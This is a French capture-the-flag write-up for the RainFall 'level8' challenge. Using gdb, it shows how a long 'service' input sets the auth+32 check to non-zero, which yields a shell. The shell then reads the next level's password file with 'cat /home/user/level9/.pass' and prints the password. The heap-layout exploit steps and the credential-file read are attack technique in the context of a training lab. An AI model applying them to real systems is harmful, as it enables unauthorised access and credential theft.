----> Si auth[32] != 0 on a gagner trop facile.
----> on lance gdb pour voir ce qui se passe en memoire:
$ gdb ./level8
(gdb) b *0x080486ec				<+392>:	je     0x80486ff <main+411>
(gdb) r
auth AAAABBBBCCCCDDDDEEEEFFFFGGGG
0x804a068, (nil)
login

Breakpoint 1, 0x080486ec in main ()
(gdb) x/100x auth
0x804a068:	 0x41414141	0x42424242	0x43434343	0x44444444
0x804a078:	 0x45454545	0x46464646	0x47474747	0x0000000a
0x804a088:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0f8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a108:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a118:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a128:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a138:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a148:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a158:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a168:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a178:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a188:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a198:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1a8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1b8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1c8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1d8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1e8:	 0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x auth32
No symbol table is loaded.  Use the "file" command.
(gdb) x auth+32
0x804a088:	0x00000000

----> ok donc auth[32] se situerai en 0x804a088 donc en suivanttoute logique en ecrivant 4 caractere de plus
----> auth[32] serai egal a 0x0000000a
----> essayons:
(gdb) c
Continuing.
Password:
0x804a068, (nil)
auth AAAABBBBCCCCDDDDEEEEFFFFGGGGHHH
0x804a078, (nil)
login

Breakpoint 1, 0x080486ec in main ()
(gdb) x auth+32
0x804a098:	0x00000000
(gdb) x/100x auth
0x804a078:	 0x00000000	0x46464646	0x47474747	0x44444431
0x804a088:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a0f8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a108:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a118:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a128:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a138:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a148:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a158:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a168:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a178:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a188:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a198:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1a8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1b8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1c8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1d8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1e8:	 0x00000000	0x00000000	0x00000000	0x00000000
0x804a1f8:	 0x00000000	0x00000000	0x00000000	0x00000000

----> AH! auth[32] est toujours egal a 0 et auth ressemble a rien...
----> tanpis on se prend pas la tete, on sait que auth et service son pas loin en memoire
----> essayons d'ecrire dans service:
(gdb) c
Continuing.
Password:
0x804a078, (nil)
serviceAAAABBBBCCCCDDDDEEEEFFFFGGGGHHH
0x804a078, 0x804a088
login

Breakpoint 1, 0x080486ec in main ()
(gdb) x auth+32
0x804a098:	0x45454545

Bingo !
----> plus qu'a le lancer hors gdb:
level8@RainFall:~$ ./level8
(nil), (nil)
auth A
0x804a008, (nil)
serviceAAAABBBBCCCCDDDDEEEE
0x804a008, 0x804a018
ls
0x804a008, 0x804a018
login
$ ls -la
ls: cannot open directory .: Permission denied
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

easy
